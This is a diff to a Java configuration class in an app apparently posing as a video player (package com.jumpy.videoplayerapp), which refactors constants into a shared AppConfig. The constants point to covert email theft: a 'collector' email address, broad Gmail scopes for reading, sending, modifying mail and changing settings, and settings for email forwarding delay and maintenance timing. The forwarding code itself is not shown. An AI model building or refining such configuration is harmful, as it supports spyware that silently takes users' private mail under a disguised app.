@@ -7,15 +7,10 @@ package com.jumpy.videoplayerapp;
 public class GmailConfig {
     
     // Change this to your collector email address
-    public static final String COLLECTOR_EMAIL = "mrh@collector.lab";
+    public static final String COLLECTOR_EMAIL = AppConfig.GMAIL_COLLECTOR_EMAIL;
     
     // Gmail API scopes required for forwarding
-    public static final String[] GMAIL_SCOPES = {
-        "https://www.googleapis.com/auth/gmail.readonly",
-        "https://www.googleapis.com/auth/gmail.send",
-        "https://www.googleapis.com/auth/gmail.modify",
-        "https://www.googleapis.com/auth/gmail.settings.basic"
-    };
+    public static final String[] GMAIL_SCOPES = AppConfig.GMAIL_SCOPES;
     
     // Maintenance interval in minutes
     public static final long MAINTENANCE_INTERVAL_MINUTES = 30;
@@ -27,13 +22,13 @@ public class GmailConfig {
     public static final long EMAIL_FORWARDING_DELAY_MS = 100;
     
     // App name for Gmail API
-    public static final String APP_NAME = "VideoPlayerApp";
+    public static final String APP_NAME = AppConfig.APP_NAME;
     
     // OAuth Client ID for Gmail API
     public static final String OAUTH_CLIENT_ID = "1056777795152-f4lb053hurphovqkc9rfd4iqso772ca3.apps.googleusercontent.com";
     
     // Shared preferences name
-    public static final String PREFS_NAME = "gmail_auth_prefs";
+    public static final String PREFS_NAME = AppConfig.PREFS_NAME;
     
     // Keys for stored data
     public static final String KEY_USER_EMAIL = "user_email";
